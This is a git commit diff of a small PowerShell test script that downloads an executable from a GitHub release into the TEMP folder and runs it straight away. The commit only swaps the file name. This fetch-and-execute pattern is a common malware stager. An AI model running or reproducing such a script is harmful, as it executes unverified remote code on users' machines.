e839c275339ca316f84269cecac445f097d6d82d
mirapuedovolar2 <cuentaparametasimon@gmail.com>
2025-04-24 11:46:43 -0400

    Update prueba4.ps1

--- prueba4.ps1
+++ prueba4.ps1
@@ -1,7 +1,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebahola/oconsole.exe"
-$destino = "$env:TEMP\oconsole.exe"
+$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/pruebas/estesiquesi.exe"
+$destino = "$env:TEMP\estesiquesi.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $destino
 Start-Process -FilePath $destino
